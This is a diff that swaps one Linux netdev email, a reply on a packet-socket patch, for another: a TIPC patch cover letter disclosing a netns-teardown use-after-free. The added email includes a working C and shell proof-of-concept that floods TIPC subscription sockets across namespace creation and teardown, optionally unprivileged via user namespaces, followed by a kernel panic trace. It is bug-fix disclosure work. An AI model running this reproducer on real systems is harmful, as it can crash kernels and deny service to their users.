@@ -1,50 +1,82 @@
-Received: from m16.mail.163.com (m16.mail.163.com [220.197.31.5])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj2-f41.google.com (mail-pj2-f41.google.com [74.125.227.169])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 995B13783C5;
-	Mon, 28 Sep 2026 08:22:35 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=220.197.31.5
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9264546D56E
+	for <netdev@vger.kernel.org>; Mon, 28 Sep 2026 08:24:57 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.169
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790583759; cv=none; b=u+yVY5W8DRkKzxaDXoCE8B/MqQ0/PDfN23eGxSo2oCR2Jr66DbsbIn2nnF8+NwYumLenzAFMhuUbVUFa7uVH1qKfcvF82/tgQHhtTP/3p+flc9fk6+33P4j7ZBeRzqy3t1DKO6AT4KT72z3AYQQK2aoLrfeC9uYDbCF/xzAk2v4=
+	t=1790583900; cv=none; b=aKTUsISmOEUDyUHfI0GGzPlkR7Ko8BRoF7UAosjoeyogwrqL+tDyt/hm96oD4M4lCmNrMiCDshYnFIQUDj04kjIJkHWaittDQ3ycyKk1shBumNeLogwjcS5jCKJIUFlz2SuOn3Tk0mKcep4rCMVgHB8WzFSDC3+HPKhFhdYx/iI=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790583759; c=relaxed/simple;
-	bh=71VpvoeXO3LpPfDEq7YVyLxqUvtg8NHlN1NDuMr40OY=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=slL8x19Xejy1JEFzhkCckXBe29tGNdzJAWj9ViD1qkLLUI4bp+XcFxHsYL9o5IUqf2LAcpGMkTO8Ef/zDMK+xAJK2cXuW22mJFmlCo9ZMTlyK07YdZ9a2UAJBD4oB0hK1C8i0kPP8KlOpCqMjiCzAmgV3jZw6I2r+qA8Ee5D5co=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com; spf=pass smtp.mailfrom=163.com; dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b=JWdt5s4l; arc=none smtp.client-ip=220.197.31.5
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=163.com
+	s=arc-20240116; t=1790583900; c=relaxed/simple;
+	bh=Gcm+CSwV+Jw9KzWb9ePIgxhx5KqpNPowR4bTneMgugE=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GeZ7RpKsFr6r6jVLB8Th+y3BfI2LT30JoqmUyGd5AmgWpsxcekpY0D+oupo4gWn0kcZmZg0TvpUkSH4nnEn8QIAunCIVzJWVyn1cro0CNH/t+UkH5846kV8xz/58ueg7XLqFg5NzZyGaY9zY34ZX/0msoSFeAady2eetAxSdFMo=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VOHxLEdC; arc=none smtp.client-ip=74.125.227.169
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b="JWdt5s4l"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
-	s=s110527; h=From:To:Subject:Date:Message-ID:MIME-Version; bh=gg
-	VRzXraIyqQBjjF/f4890CVZWneX6nCin74kDHMb2o=; b=JWdt5s4lFdQK7yvKze
-	jCKdCLOHbllxC9AiuC2/U5OjoaUEsvpu/RXR4A8ItD6h01qdT+B03jUwe2cHxSqJ
-	Y2Q9ZgqLQl0phL1S6ToRUXLTX525OqLGmsAgxLcy03zfNLJWqf5AQfHR+Louk5+m
-	tCsQkdRxlWETf1rLHd7eo0yFg=
-Received: from chaosheng-ASUS-TUF-Gaming-F16-FX607JV-FX607JV.lan (unknown [])
-	by gzga-smtp-mtada-g1-3 (Coremail) with SMTP id _____wDXX4GjI7pqCAGkBQ--.42849S2;
-	Mon, 28 Sep 2026 16:21:56 +0800 (CST)
-From: Quchaosheng <quchaosheng000406@163.com>
-To: netdev-bot+sinfo@kernel.org
-Cc: Quchaosheng <quchaosheng000406@163.com>,
-	Willem de Bruijn <willemdebruijn.kernel@gmail.com>,
-	"David S. Miller" <davem@davemloft.net>,
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VOHxLEdC"
+Received: by mail-pj2-f41.google.com with SMTP id 98e67ed59e1d1-3a0bd71827eso1483250a91.0
+        for <netdev@vger.kernel.org>; Mon, 28 Sep 2026 01:24:57 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1790583897; x=1791188697; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=CdFDwwZxyhnxAbN7zzF1lQu0yPjid5h0AcfNO/Os8Mg=;
+        b=VOHxLEdCyGwsVpxxumT5pYrO1/xI64W1rbVYDRl1IFnBTPSnsJcWp6mvhLSY+DfK8r
+         Hb6x59XOWpIqFjy3KGG93iV/rzLeNmBkyF/kuPYDJGL25SFhPoZqn1cwY3k9bYrEyYPA
+         ipRUk184HeZ0VjK3mMbDE2ezfDzgX+j9HDENMOIGfaO2ttiyq7ZWcdVJGx57Jpjm6kuK
+         tIqkii0etEURKUGaGZVVNu6/GpTI9Q6J4QJZIk6yWFgWH20lFzDfflNiF+TNZ1aS+0eA
+         0ObTITQp79K3LA4LxqraGOxFd+K+Vh1XXFokGnJd30lSkr8I3kRkk/SSEbJH3Nc5Qs15
+         dwAg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1790583897; x=1791188697;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=CdFDwwZxyhnxAbN7zzF1lQu0yPjid5h0AcfNO/Os8Mg=;
+        b=LXKbsZ1PDWPLM4OrZN668bq3cAiRF8sxNqDv7iKhSbd0fmAXfId9B4pXbcNevZ3Ys+
+         uGFMkfHibQ6JNZvZc1gk1MgzP6J5xVuWJv8mSD9h2RNfgHhFsTJ7AdJjxYO53o0HP1Pi
+         W1fZjVtqeJNgWI6q3xfmSjGp0xjdrp6w3T/x9IcTmkh3qkkUhsyuHLtQzPmMLilPTss8
+         DQTF7oiQCxZUTjHtDEKePdhV7L8NmpPBWukeynZ1wFthEiTtqcmnljz2sPwHjT6IxyrC
+         C1kcIWVMMDyaW6ej97W6M6uiOgSExelKz/ysdPXdg6FTF1s+MB50A00l9wOu4wW6nY+V
+         lOlw==
+X-Gm-Message-State: AFq9FYIK/gcCx1HfLomoeAb+voqGkTMxPBZYUaa1oBFVU252/PeCDZ0Z
+	25HEzvHnDcsW9cOb/UyAjpjihRaX5OEybbAsTtNMRMkjN1FSXeCsCupsm/hU+FLA5xYwHw==
+X-Gm-Gg: AYBFou3FLjDIvJZXFwl5RXgVbESRHRPiMtTFKmmczvnK2z63gi0E62Bm77MvR2fjqgI
+	0GO9rtg7cHNqw4C63XZQxm828HiSJeYAG3yE/DCdaEazcsG2B0Hcf1UASZiB6WaGaAGot8Jxmwq
+	CPHnuMHg+A7a8NJgyGcDeClJFsq5J+M9GRSgtD/rx3xyCwQQN0S8Q1zoBdsrQqSLmHvVk/8jPID
+	i99QNVCI4N3NjeLJp/sLAQX/nB8qm2xQpCn5/bKMcyurL/vuTR6YDW0dXJTvqhhGBcliMyT6IC6
+	LxBhoZFELBaGZ3P3e35m+qN42aplRCUDrHyzdHZUtPxnxhVoD5xVXXGhdi7Ox0Ovsi5gvMHzdG8
+	Zy8n0Zgb1hzbP3FFHHAx3JkdFR1c5Y0rU+g9EL2KAs7koS7ry+Kd96C7D/Fa3v43yB5FGla74Lc
+	fp5NXzTqi7pCqoFDIBP/wdSWG22Q5AR+DXccOtCRvGNrEWcPYNwTBSUBa6iD9Wp0E//6hovWn7p
+	c+b6QZhMe2Ba1mvegNfvH5qTnZmBzOQPxrJsPA1HJ8OW7Ci9xczgr7n7ve/lsOryvHh9JnRMEdQ
+	kU20Iim7
+X-Received: by 2002:a17:90b:17c7:b0:3a0:ab20:9e88 with SMTP id 98e67ed59e1d1-3a0ab20a125mr7936817a91.44.1790583896727;
+        Mon, 28 Sep 2026 01:24:56 -0700 (PDT)
+Received: from lenovo-thinkbook.lenovo.com (42-2-127-248.static.netvigator.com. [42.2.127.248])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b8d31b4esm7104456a91.3.2026.09.28.01.24.44
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 28 Sep 2026 01:24:56 -0700 (PDT)
+From: Yuqi Xu <xuyuqiabc@gmail.com>
+To: netdev@vger.kernel.org,
+	Tung Quang Nguyen <tung.quang.nguyen@est.tech>
+Cc: Jon Maloy <jmaloy@redhat.com>,
+	"David S . Miller" <davem@davemloft.net>,
 	Eric Dumazet <edumazet@google.com>,
 	Jakub Kicinski <kuba@kernel.org>,
 	Paolo Abeni <pabeni@redhat.com>,
 	Simon Horman <horms@kernel.org>,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org,
-	Marc Kleine-Budde <mkl@pengutronix.de>,
-	Oliver Hartkopp <socketcan@hartkopp.net>,
-	stable@vger.kernel.org
-Subject: Re: [PATCH v2 net] net/packet: guard the ll header push in packet_rcv_spkt()
-Date: Mon, 28 Sep 2026 16:21:40 +0800
-Message-ID: <20260928082140.1899337-1-quchaosheng000406@163.com>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <179058331782.31693.12350465700616409287@kernel.org>
-References: <20260928065000.1749383-1-quchaosheng000406@163.com> <20260928065000.1749383-2-quchaosheng000406@163.com> <a56a3e49-ffdf-4285-bca6-992b12127289@hartkopp.net> <20260928080919.1888649-1-quchaosheng000406@163.com> <179058331782.31693.12350465700616409287@kernel.org>
+	Ying Xue <ying.xue@windriver.com>,
+	Paul Gortmaker <paul.gortmaker@windriver.com>,
+	tipc-discussion@lists.sourceforge.net,
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Ren Wei <weir@nebusec.ai>,
+	xuyq21@lenovo.com
+Subject: [PATCH net v3 0/1] tipc: fix connection lifetime during netns teardown
+Date: Mon, 28 Sep 2026 16:24:37 +0800
+Message-ID: <cover.1790157006.git.xuyuqiabc@gmail.com>
+X-Mailer: git-send-email 2.55.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -52,32 +84,432 @@ List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
-X-CM-TRANSID:_____wDXX4GjI7pqCAGkBQ--.42849S2
-X-Coremail-Antispam: 1Uf129KBjvdXoWrtr18try8GFyrCw48Xr1rtFb_yoWDKrgE9a
-	4kZ34DXw4UJrsxWrWYkr4YyryDGayDA34rWrZ5Xr43Kr95urs8ZanxJr1S9F90yF1xKFsx
-	Gw1FvwsavwsI9jkaLaAFLSUrUUUUjb8apTn2vfkv8UJUUUU8Yxn0WfASr-VFAUDa7-sFnT
-	9fnUUvcSsGvfC2KfnxnUUI43ZEXa7VUj6nmtUUUUU==
-X-CM-SenderInfo: xtxfxtprvkv0bjqqikiqw6il2tof0z/xtbC5AQ7sGq6I6TdQQAA3g
 
-Manual code inspection, and nothing reported it before this.
+Hi Linux kernel maintainers,
 
-I was working out what else the CAN skb header regression (9f10374bb024)
-reaches, and the packet socket turned out not to be covered by the CAN
-patch: packet_rcv_spkt() is the one call site of the ll header restore
-that d549699048b4 left without dev_has_header(), and SOCK_PACKET reaches
-it.  It came out of reading the receive paths, not from a scan, a tool
-or a report.
+We found and validated an issue in net/tipc/topsrv.c. The PoC
+supports --userns (CLONE_NEWUSER|CLONE_NEWNET) for an unprivileged
+user, but the captured traces are root mode.
 
-Because nothing had reported it, I built the reproduction before posting
-rather than sending a theoretical path:
+We've tested it, and it should not affect any other functionality.
 
-  v7.3-rc5 under QEMU, slcan on a pty (the driver RX path; vcan resets
-  the headers in can_send() and does not reproduce it), defconfig plus
-  CONFIG_CAN_SLCAN=y, two images from one tree differing only in the
-  hunk.  Unpatched: skb_under_panic len:-65455 out of
-  packet_rcv_spkt+0xe1 and a panic in interrupt.  Patched: no panic.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-The v1 had an extra skb_mac_header_was_set() conjunct; v2 drops it after
-Oliver asked whether af_packet.c was the right place for this, and both
-kernels were re-run with the version posted here.
+Changes in v3:
+ - This version supersedes the narrower diff Tung Quang Nguyen
+   posted in-thread on 2026-09-23 (replying to v2 1/2, Message-ID
+   DU4P189MB3750BEF36FF7EEBA03E152FFC6822@DU4P189MB3750.EURP189.PROD.OUTLOOK.COM).
+   v3 keeps his teardown order and adds the lookup refusal and the
+   empty-idr unlock.
+ - Teardown order kept from that diff: set listener = NULL under
+   idr_lock, refuse new queue_work, destroy the send/receive
+   workqueues, then close remaining connections.
+ - Added on top of that diff: refuse tipc_conn_lookup() after
+   listener is NULL, and drop idr_lock when the conn_idr walk finds
+   no connection, so an in-flight subscription event cannot pin the
+   walk.
+ - Drop v2 2/2. Once in-flight work is flushed first, the conn_idr
+   walk rewrite is not needed.
+ - Point Fixes: at c5fa7b3cf3cb, which first closed connections while
+   the workqueues were still live.
+ - Tested with ./poc -i 6000 -t 4 -r 5000 and ./poc -i 6000 -t 4
+   -r 20000 (6000 iterations each, no warning/Oops/RCU stall).
+ - v2 Link: https://lore.kernel.org/all/cover.1789960909.git.xuyuqiabc@gmail.com/
 
+Changes in v2:
+ - Add the exact reproduction command and the stack traces we observe
+   to this changelog, as requested by Tung Quang Nguyen.
+ - v1 Link: https://lore.kernel.org/all/cover.1789722780.git.xuyuqiabc@gmail.com/
+
+Reproduction command (root mode, matching the captured trace):
+
+  # 2 vCPU, 2 GB RAM x86_64 QEMU
+  # Linux 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy)
+  sysctl -w kernel.panic_on_rcu_stall=1
+  echo 20 > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
+  MODE=root ./poc.sh 6000 4 20000
+  # i.e. ./poc -i 6000 -t 4 -r 20000
+
+The captured trace is root mode (UID 0). Its kernel banner is
+Linux 7.3.0-rc3-00344-g1e24c4f2ee44, which is not the series
+base-commit. The PoC supports --userns, but that mode is not what
+this trace shows. This run hit an RCU stall at about 20 s
+(t=20002 jiffies). The crash-log section below is a contiguous
+excerpt of that same trace.
+
+With only v2 1/2 applied, Tung Nguyen also observed:
+
+[  271.777368] refcount_t: addition on 0; use-after-free.
+[  271.794423] Workqueue: netns cleanup_net
+[  271.810559]  tipc_topsrv_exit_net+0x1b4/0x1e0 [tipc]
+...
+[  271.846984] BUG: unable to handle page fault for address: 00000001000002cf
+[  271.872088]  tipc_conn_close+0x24/0xa0 [tipc]
+[  271.872938]  tipc_topsrv_exit_net+0x108/0x1e0 [tipc]
+
+That is the same root cause: send/receive work still running during
+the connection walk. v3 destroys those workqueues first.
+
+---- details below ----
+
+Bug details:
+
+`tipc_topsrv_stop()` closed subscriber connections while the topology
+server's send and receive workqueues were still running. Socket
+callbacks and subscription events could then queue more work, and
+in-flight send/recv work could drop the last connection reference
+during the conn_idr walk. That is a use-after-free / refcount race
+on netns teardown, also visible as an RCU stall in
+`tipc_topsrv_exit_net()` and as `queue_work()` on a destroyed
+workqueue from the listener data-ready callback.
+
+Reproducer:
+
+#!/bin/sh
+set -eu
+
+SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
+
+ITERATIONS="${1:-6000}"
+THREADS="${2:-4}"
+RUNTIME_USEC="${3:-20000}"
+MODE="${MODE:-root}"              # root | userns
+STALL_TIMEOUT="${STALL_TIMEOUT:-20}"
+CC_BIN="${CC:-gcc}"
+
+cd "$SCRIPT_DIR"
+
+"$CC_BIN" -O2 -Wall -pthread -o poc poc.c
+
+if [ "${SET_PANIC_ON_RCU_STALL:-1}" = "1" ] && [ "$(id -u)" -eq 0 ]; then
+	sysctl -w kernel.panic_on_rcu_stall=1 >/dev/null 2>&1 || true
+	if [ -w /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout ]; then
+		echo "$STALL_TIMEOUT" > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
+	fi
+fi
+
+if [ "$MODE" = "userns" ]; then
+	CMD="./poc --userns -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
+else
+	CMD="./poc -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
+fi
+
+echo "[*] running: $CMD"
+exec sh -c "$CMD"
+
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <getopt.h>
+#include <linux/tipc.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+static atomic_int stop_flag;
+
+struct run_cfg {
+	int iterations;
+	int threads;
+	int runtime_usec;
+	int ns_flags;
+};
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"Usage: %s [-i iterations] [-t threads] [-r runtime_usec] [--userns]\n"
+		"  -i, --iterations   number of fork/teardown cycles (default: 6000)\n"
+		"  -t, --threads      flood worker threads per cycle (default: 4)\n"
+		"  -r, --runtime-us   worker runtime per cycle in usec (default: 20000)\n"
+		"  -U, --userns       use CLONE_NEWUSER|CLONE_NEWNET (for non-root)\n",
+		prog);
+}
+
+static void parse_args(int argc, char **argv, struct run_cfg *cfg)
+{
+	static const struct option long_opts[] = {
+		{ "iterations", required_argument, NULL, 'i' },
+		{ "threads", required_argument, NULL, 't' },
+		{ "runtime-us", required_argument, NULL, 'r' },
+		{ "userns", no_argument, NULL, 'U' },
+		{ "help", no_argument, NULL, 'h' },
+		{ 0, 0, 0, 0 },
+	};
+	int c;
+
+	cfg->iterations = 6000;
+	cfg->threads = 4;
+	cfg->runtime_usec = 20000;
+	cfg->ns_flags = CLONE_NEWNET;
+
+	while ((c = getopt_long(argc, argv, "i:t:r:Uh", long_opts, NULL)) != -1) {
+		switch (c) {
+		case 'i':
+			cfg->iterations = atoi(optarg);
+			break;
+		case 't':
+			cfg->threads = atoi(optarg);
+			break;
+		case 'r':
+			cfg->runtime_usec = atoi(optarg);
+			break;
+		case 'U':
+			cfg->ns_flags = CLONE_NEWUSER | CLONE_NEWNET;
+			break;
+		case 'h':
+		default:
+			usage(argv[0]);
+			exit(c == 'h' ? 0 : 1);
+		}
+	}
+
+	if (cfg->iterations <= 0 || cfg->threads <= 0 || cfg->runtime_usec < 0) {
+		usage(argv[0]);
+		exit(1);
+	}
+}
+
+static void *flood_worker(void *arg)
+{
+	uintptr_t tid = (uintptr_t)arg;
+	struct sockaddr_tipc sa;
+	struct tipc_subscr sub;
+
+	memset(&sa, 0, sizeof(sa));
+	sa.family = AF_TIPC;
+	sa.addrtype = TIPC_SERVICE_ADDR;
+	sa.scope = TIPC_NODE_SCOPE;
+	sa.addr.name.name.type = TIPC_TOP_SRV;
+	sa.addr.name.name.instance = TIPC_TOP_SRV;
+
+	memset(&sub, 0, sizeof(sub));
+	sub.seq.type = 0x20000 + (uint32_t)tid;
+	sub.seq.lower = 1;
+	sub.seq.upper = 1;
+	sub.timeout = 0xffffffffu;
+	sub.filter = TIPC_SUB_SERVICE;
+
+	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+		int fd = socket(AF_TIPC, SOCK_SEQPACKET | SOCK_NONBLOCK, 0);
+
+		if (fd < 0)
+			continue;
+
+		(void)connect(fd, (struct sockaddr *)&sa, sizeof(sa));
+		(void)send(fd, &sub, sizeof(sub), MSG_DONTWAIT);
+		close(fd);
+	}
+
+	return NULL;
+}
+
+static void run_one_iteration(const struct run_cfg *cfg)
+{
+	pthread_t *tids;
+	int i;
+
+	if (unshare(cfg->ns_flags) < 0)
+		_exit(111);
+
+	tids = calloc((size_t)cfg->threads, sizeof(*tids));
+	if (!tids)
+		_exit(1);
+
+	atomic_store_explicit(&stop_flag, 0, memory_order_relaxed);
+	for (i = 0; i < cfg->threads; i++)
+		pthread_create(&tids[i], NULL, flood_worker,
+			       (void *)(uintptr_t)(i + 1));
+
+	usleep((useconds_t)cfg->runtime_usec);
+
+	_exit(0);
+}
+
+int main(int argc, char **argv)
+{
+	struct run_cfg cfg;
+	int i;
+	int ns_failures = 0;
+
+	parse_args(argc, argv, &cfg);
+
+	for (i = 0; i < cfg.iterations; i++) {
+		pid_t pid = fork();
+		int st;
+
+		if (pid == 0)
+			run_one_iteration(&cfg);
+		if (pid < 0)
+			return 1;
+
+		if (waitpid(pid, &st, 0) < 0)
+			return 1;
+
+		if (WIFEXITED(st) && WEXITSTATUS(st) == 111)
+			ns_failures++;
+
+		if ((i % 200) == 0)
+			fprintf(stderr, "iter=%d ns_failures=%d\n", i, ns_failures);
+	}
+
+	if (ns_failures == cfg.iterations) {
+		fprintf(stderr,
+			"all iterations failed to create namespaces (EPERM likely)\n");
+		return 2;
+	}
+
+	return 0;
+}
+
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+Excerpt of the captured root-mode RCU stall on Linux
+7.3.0-rc3-00344-g1e24c4f2ee44. The guest init line in this
+excerpt is "init: starting PoC: -i 6000 -t 4 -r 20000".
+Contiguous lines copied from that trace:
+
+init: starting PoC: -i 6000 -t 4 -r 20000
+[    0.814214] poc (65) used greatest stack depth: 14112 bytes left
+[    0.814220] poc (66) used greatest stack depth: 14032 bytes left
+[    0.814306] poc (69) used greatest stack depth: 13856 bytes left
+iter=0 ns_failures=0
+[   20.832329] rcu: INFO: rcu_preempt detected stalls on CPUs/tasks:
+[   20.833203] rcu: 	(detected by 0, t=20002 jiffies, g=-1003, q=11014 ncpus=2)
+[   20.834173] rcu: All QSes seen, last rcu_preempt kthread activity 20002 (4294687948-4294667946), jiffies_till_next_fqs=3, root ->qsmask 0x0
+[   20.835838] rcu: rcu_preempt kthread starved for 20002 jiffies! g-1003 f0x2 RCU_GP_WAIT_FQS(5) ->state=R ->cpu=1
+[   20.837215] rcu: 	Unless rcu_preempt kthread gets sufficient CPU time, OOM is now expected behavior.
+[   20.838449] rcu: RCU grace-period kthread stack dump:
+[   20.839142] task:rcu_preempt     state:R  running task     stack:14744 pid:16    tgid:16    ppid:2      task_flags:0x208040 flags:0x00080000
+[   20.840822] Call Trace:
+[   20.841179]  <TASK>
+[   20.841492]  __schedule+0x440/0xf80
+[   20.842026]  ? __pfx_rcu_gp_kthread+0x10/0x10
+[   20.842648]  schedule+0x23/0xa0
+[   20.843107]  schedule_timeout+0x9e/0x120
+[   20.843662]  ? __pfx_process_timeout+0x10/0x10
+[   20.844303]  rcu_gp_fqs_loop+0xf7/0x5f0
+[   20.844835]  ? __pfx_rcu_gp_kthread+0x10/0x10
+[   20.845458]  rcu_gp_kthread+0xfa/0x1d0
+[   20.845980]  kthread+0xe1/0x120
+[   20.846431]  ? __pfx_kthread+0x10/0x10
+[   20.846949]  ret_from_fork+0x177/0x240
+[   20.847518]  ? __pfx_kthread+0x10/0x10
+[   20.848063]  ret_from_fork_asm+0x1a/0x30
+[   20.848617]  </TASK>
+[   20.848935] rcu: Stack dump where RCU GP kthread last ran:
+[   20.849696] Sending NMI from CPU 0 to CPUs 1:
+[   20.850327] NMI backtrace for cpu 1
+[   20.850330] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy) 
+[   20.850333] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[   20.850335] Workqueue: netns cleanup_net
+[   20.850340] RIP: 0010:__radix_tree_lookup+0x1b/0xa0
+[   20.850345] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f 1f 40 d6 53 49 89 f9 49 89 d2 48 89 f7 49 89 cb 49 8b 51 08 48 89 d0 83 e0 03 <48> 83 f8 02 75 70 48 89 d0 48 83 e0 fd 0f b6 08 b8 40 00 00 00 48
+[   20.850346] RSP: 0018:ffffa8134006bd70 EFLAGS: 00000202
+[   20.850348] RAX: 0000000000000002 RBX: 0000000000000000 RCX: 0000000000000000
+[   20.850349] RDX: ffff91c08169e6da RSI: ffffffffb094c358 RDI: ffffffffb094c358
+[   20.850350] RBP: ffff91c081a43f80 R08: ffff91c08169e8f8 R09: ffff91c081a43f80
+[   20.850350] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000b094c358
+[   20.850351] R13: ffff91c081a43f98 R14: ffffffffb5a40950 R15: ffff91c0815bf100
+[   20.850356] FS:  0000000000000000(0000) GS:ffff91c14746d000(0000) knlGS:0000000000000000
+[   20.850357] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   20.850358] CR2: 00007f1266956ff8 CR3: 0000000062630000 CR4: 0000000000750ef0
+[   20.850359] PKRU: 55555554
+[   20.850360] Call Trace:
+[   20.850361]  <TASK>
+[   20.850362]  tipc_topsrv_exit_net+0x8b/0x1a0
+[   20.850367]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   20.850369]  ops_undo_list+0xef/0x250
+[   20.850372]  cleanup_net+0x1d2/0x330
+[   20.850375]  process_one_work+0x197/0x390
+[   20.850379]  worker_thread+0x169/0x2d0
+[   20.850382]  ? __pfx_worker_thread+0x10/0x10
+[   20.850384]  kthread+0xe1/0x120
+[   20.850386]  ? __pfx_kthread+0x10/0x10
+[   20.850388]  ret_from_fork+0x177/0x240
+[   20.850391]  ? __pfx_kthread+0x10/0x10
+[   20.850393]  ret_from_fork_asm+0x1a/0x30
+[   20.850398]  </TASK>
+[   20.876630] Kernel panic - not syncing: RCU Stall
+[   20.877303] CPU: 0 UID: 0 PID: 32 Comm: kworker/u8:1 Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(lazy) 
+[   20.878915] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[   20.880467] Workqueue: tipc_rcv tipc_topsrv_accept
+[   20.881150] Call Trace:
+[   20.881515]  <IRQ>
+[   20.881817]  dump_stack_lvl+0x4d/0x70
+[   20.882370]  vpanic+0x201/0x3f0
+[   20.882826]  panic+0x66/0x70
+[   20.883268]  ? irq_work_queue+0x2e/0x60
+[   20.883817]  panic_on_rcu_stall.isra.0+0x2b/0x30
+[   20.884505]  rcu_sched_clock_irq.cold+0x1bb/0x422
+[   20.885197]  ? __pfx_tick_nohz_handler+0x10/0x10
+[   20.885847]  update_process_times+0x81/0xd0
+[   20.886470]  tick_nohz_handler+0x8c/0x160
+[   20.887061]  __hrtimer_run_queues+0xf3/0x220
+[   20.887665]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   20.888355]  hrtimer_interrupt+0x102/0x1f0
+[   20.888925]  ? __pfx_hrtimer_interrupt+0x10/0x10
+[   20.889592]  __sysvec_apic_timer_interrupt+0x53/0x110
+[   20.890307]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   20.890968]  sysvec_apic_timer_interrupt+0x66/0x80
+[   20.891641]  </IRQ>
+[   20.891950]  <TASK>
+[   20.892270]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
+[   20.892986] RIP: 0010:queued_spin_lock_slowpath+0x130/0x2b0
+[   20.893753] Code: c0 0f 85 e4 00 00 00 be 01 00 00 00 f0 0f b1 31 0f 85 d5 00 00 00 66 90 65 ff 0d 37 8e 41 01 48 83 c4 20 e9 ed f5 c5 fe f3 90 <e9> d9 fe ff ff 65 8b 05 0c 25 40 01 48 0f a3 05 24 32 c4 00 73 d8
+[   20.896267] RSP: 0018:ffffa81340117df8 EFLAGS: 00000202
+[   20.897002] RAX: 0000000000000001 RBX: ffff91c082001cc0 RCX: ffff91c081a43f98
+[   20.897983] RDX: 0000000000000001 RSI: 0000000000000001 RDI: ffff91c081a43f98
+[   20.898959] RBP: ffff91c081a43f80 R08: 00000000000000c0 R09: ffff91c082001cc0
+[   20.899946] R10: ffff91c082001cc0 R11: 0000000000000000 R12: ffff91c081a43f80
+[   20.900924] R13: ffff91c082a8f440 R14: 0000000000000000 R15: ffff91c081a43fa8
+[   20.901905]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   20.902581]  tipc_conn_alloc+0xaf/0x150
+[   20.903126]  tipc_topsrv_accept+0x7d/0x170
